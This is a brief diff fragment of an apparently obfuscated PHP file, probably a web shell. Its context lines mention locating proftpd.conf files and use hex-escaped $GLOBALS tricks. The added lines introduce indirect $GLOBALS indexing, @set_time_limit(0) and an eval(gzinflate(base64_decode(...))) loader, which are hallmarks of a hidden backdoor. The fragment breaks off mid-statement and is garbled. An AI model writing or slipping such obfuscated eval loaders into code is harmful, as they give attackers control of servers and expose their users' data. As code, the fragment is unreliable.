@@ -19,4 +19,6 @@ rP2HruxcliaIvUpOojGVJZaa3k0biQwygt77gZCg995
 vGDAPO8 = 'G45IGr6HSrUIBPswh8B4h8Lv0UvjkNccrM6Pe1SPe1Ky
 ${"\x47LOB\x41\x4c\x53"}
 locate proftpd.conf files
-'] = "\x79\x34\x70\x3b\x33\x55\x7a\x54\x7d\x4b\x53\x2e
+foreach ($GLOBALS[$GLOBALS[
+";@set_time_limit(0);if(!defined("
+eval(gzinflate(base64_decode(
